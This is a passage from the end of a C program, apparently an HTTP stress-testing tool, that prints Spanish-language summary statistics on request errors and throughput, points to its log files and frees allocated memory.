        printf("Tasa de error: %.2f%%\n", (total_errors * 100.0) / total_requests);
        printf("Solicitudes por segundo: %.2f\n", total_requests / elapsed_time);
    }
    if (total_success > 0) {
        printf("Tiempo promedio por solicitud exitosa: %.4fs\n", total_time / total_success);
    }
    
    printf("\nRegistros detallados en: %s/\n", log_dir);
    printf("- success.log: Solicitudes exitosas\n");
    printf("- errors.log: Solicitudes con errores\n");
    
    if (total_errors > 0) {
        printf("\n⚠ Advertencia: Se detectaron %d errores durante la prueba.\n", total_errors);
        printf("Revise el archivo %s/errors.log para detalles completos.\n", log_dir);
        printf("Esto podría indicar problemas de rendimiento o estabilidad.\n");
    } else {
        printf("\n✅ ¡Prueba de estrés completada exitosamente sin errores!\n");
    }
    
    printf("\nPrueba de estrés finalizada.\n");
    
    // Liberar memoria
    for (int i = 0; i < url_count; i++) {
        free(urls[i]);
    }
    free(urls);
    free(threads);
    free(thread_data);
    
    return 0;
}
